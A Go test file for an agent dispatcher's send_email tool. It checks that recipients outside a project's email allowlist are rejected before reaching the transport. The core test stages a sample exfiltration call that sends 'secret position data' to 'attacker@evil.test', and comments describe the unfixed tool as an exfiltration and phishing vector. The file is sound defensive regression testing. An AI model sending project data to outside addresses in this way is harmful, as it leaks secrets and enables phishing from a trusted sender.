package dispatcher

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/rs/zerolog"
	"github.com/stretchr/testify/require"
	"vornik.io/vornik/internal/registry"
)

// auditFakeEmailSender records the args it was asked to send so a
// test can assert whether the recipient gate let a call through to
// the transport. SendEmail is never expected to fire for an
// off-allowlist recipient — sentTo stays empty in that case.
type auditFakeEmailSender struct {
	sentTo string
	called bool
}

func (f *auditFakeEmailSender) SendEmail(_ context.Context, _ string, req EmailSendRequest) (string, error) {
	f.called = true
	f.sentTo = req.To
	return "<fake-message-id@vornik>", nil
}

// loadAuditEmailRegistry stages a project with a full, valid email
// block whose sender_allowlist scopes both inbound and (post-fix)
// outbound. The allowlist mixes a bare domain and a full address so
// the regression covers both match arms.
func loadAuditEmailRegistry(t *testing.T, allowlist string) *registry.Registry {
	t.Helper()
	configDir := t.TempDir()
	require.NoError(t, os.MkdirAll(filepath.Join(configDir, "projects"), 0o755))
	require.NoError(t, os.MkdirAll(filepath.Join(configDir, "swarms"), 0o755))
	require.NoError(t, os.MkdirAll(filepath.Join(configDir, "workflows"), 0o755))

	require.NoError(t, os.WriteFile(filepath.Join(configDir, "swarms", "s1.md"), []byte(`---
swarmId: "s1"
roles:
  - name: "coder"
    runtime:
      image: "test:latest"
---
`), 0o644))

	require.NoError(t, os.WriteFile(filepath.Join(configDir, "workflows", "wf.md"), []byte(`---
workflowId: "wf"
entrypoint: "run"
steps:
  run:
    type: "agent"
    prompt: "do work"
    role: "coder"
    on_success: "done"
terminals:
  done:
    status: "COMPLETED"
---
`), 0o644))

	require.NoError(t, os.WriteFile(filepath.Join(configDir, "projects", "p1.yaml"), []byte(`
projectId: "p1"
displayName: "Test Project"
swarmId: "s1"
defaultWorkflowId: "wf"
email:
  imap_host: "imap.example.test"
  imap_username: "bot@trusted.test"
  imap_password_env: "IMAP_PW"
  smtp_host: "smtp.example.test"
  smtp_username: "bot@trusted.test"
  smtp_password_env: "SMTP_PW"
  from_address: "bot@trusted.test"
  sender_allowlist:
`+allowlist), 0o644))

	reg := registry.New()
	require.NoError(t, reg.Load(configDir))
	return reg
}

// TestSendEmail_RejectsOffAllowlistRecipient is the core regression:
// with a non-empty sender_allowlist configured, the send_email tool
// must refuse a recipient that is not on the list and must NOT reach
// the EmailSender transport. Pre-fix the gate did not exist and the
// off-allowlist address was sent from the project's trusted From:
// (exfiltration / phishing vector).
func TestSendEmail_RejectsOffAllowlistRecipient(t *testing.T) {
	reg := loadAuditEmailRegistry(t, "    - \"ops@trusted.test\"\n")
	fake := &auditFakeEmailSender{}
	te := &ToolExecutor{registry: reg, emailSender: fake, logger: zerolog.Nop()}

	args, _ := json.Marshal(map[string]string{
		"to":      "attacker@evil.test",
		"subject": "exfil",
		"body":    "secret position data",
	})
	res := te.sendEmail(context.Background(), string(args), "p1", []string{"p1"})

	require.False(t, fake.called,
		"off-allowlist recipient must be rejected before reaching the EmailSender transport")
	require.Contains(t, res.Content, "not on this project's email allowlist",
		"caller should get an operator-readable rejection, got: %q", res.Content)
}

// TestSendEmail_PermitsOnAllowlistRecipient proves the gate doesn't
// over-block: an address on the configured allowlist still sends.
func TestSendEmail_PermitsOnAllowlistRecipient(t *testing.T) {
	reg := loadAuditEmailRegistry(t, "    - \"ops@trusted.test\"\n")
	fake := &auditFakeEmailSender{}
	te := &ToolExecutor{registry: reg, emailSender: fake, logger: zerolog.Nop()}

	args, _ := json.Marshal(map[string]string{
		"to":      "ops@trusted.test",
		"subject": "summary",
		"body":    "all good",
	})
	res := te.sendEmail(context.Background(), string(args), "p1", []string{"p1"})

	require.True(t, fake.called, "on-allowlist recipient should be sent")
	require.Equal(t, "ops@trusted.test", fake.sentTo)
	require.Contains(t, res.Content, "Email sent to ops@trusted.test")
}

// TestSendEmail_AllowsDomainEntry covers the bare-domain match arm:
// a domain entry admits any recipient at that domain.
func TestSendEmail_AllowsDomainEntry(t *testing.T) {
	reg := loadAuditEmailRegistry(t, "    - \"trusted.test\"\n")
	fake := &auditFakeEmailSender{}
	te := &ToolExecutor{registry: reg, emailSender: fake, logger: zerolog.Nop()}

	args, _ := json.Marshal(map[string]string{
		"to":      "anyone@trusted.test",
		"subject": "s",
		"body":    "b",
	})
	res := te.sendEmail(context.Background(), string(args), "p1", []string{"p1"})

	require.True(t, fake.called, "recipient at an allowlisted domain should be sent")
	require.Contains(t, res.Content, "Email sent to anyone@trusted.test")
}

// TestRecipientAllowed_Semantics unit-tests the gate primitive
// directly, mirroring email.TestSenderAllowlist_* coverage.
func TestRecipientAllowed_Semantics(t *testing.T) {
	cases := []struct {
		name      string
		allowlist []string
		to        string
		want      bool
	}{
		{"empty list permits all", nil, "anyone@anywhere.test", true},
		{"whitespace-only list permits all", []string{"  ", "\t"}, "anyone@anywhere.test", true},
		{"full address match", []string{"ops@trusted.test"}, "ops@trusted.test", true},
		{"full address case-insensitive", []string{"ops@trusted.test"}, "OPS@Trusted.Test", true},
		{"full address miss", []string{"ops@trusted.test"}, "attacker@evil.test", false},
		{"domain match", []string{"trusted.test"}, "anyone@trusted.test", true},
		{"domain miss", []string{"trusted.test"}, "anyone@evil.test", false},
		{"empty recipient rejected when list set", []string{"trusted.test"}, "", false},
		{"no-at recipient rejected when domain list set", []string{"trusted.test"}, "trusted.test", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := recipientAllowed(tc.allowlist, tc.to); got != tc.want {
				t.Errorf("recipientAllowed(%v, %q) = %v, want %v", tc.allowlist, tc.to, got, tc.want)
			}
		})
	}
}
